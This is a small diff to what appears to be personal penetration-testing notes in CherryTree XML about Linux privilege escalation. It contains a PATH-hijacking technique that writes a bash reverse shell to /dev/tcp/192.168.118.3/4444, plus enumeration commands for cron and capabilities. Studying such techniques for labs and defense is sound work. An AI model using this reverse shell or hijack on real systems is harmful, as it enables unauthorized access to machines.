@@ -444,7 +444,7 @@ Also check this out: </rich_text>
       <rich_text>We have to pay attention to </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886433">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886443">
         <rich_text>!Check if we are in a container:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -516,7 +516,7 @@ Check capabilities:
 export PATH=/tmp:$PATH
 # and add to that path a reverse shell with the name of that binary system call without absolute path
 echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
-chmod +x lscpu</codebox>
+chmod +x /tmp/{binary}</codebox>
         <codebox char_offset="722" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
         <codebox char_offset="822" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
 # And search for everyone</codebox>
